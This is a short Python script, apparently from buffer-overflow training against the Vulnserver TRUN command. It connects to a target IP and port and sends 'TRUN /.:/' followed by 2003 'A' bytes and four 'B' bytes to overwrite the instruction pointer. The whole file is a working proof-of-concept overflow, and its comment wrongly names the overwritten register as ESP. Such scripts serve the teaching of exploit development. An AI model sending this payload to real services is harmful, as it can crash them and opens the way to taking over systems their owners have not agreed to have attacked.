#!/usr/bin/python3


import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4   # A * [offset_lenght] + B * 4 (ESP registrer_4-bytes) 
ip = sys.argv[1]
port = int(sys.argv[2])

try:
	print("Sending EIP overwrite...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	payload = "TRUN /.:/" + shellcode
	s.send((payload.encode()))
	s.recv(1024)
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
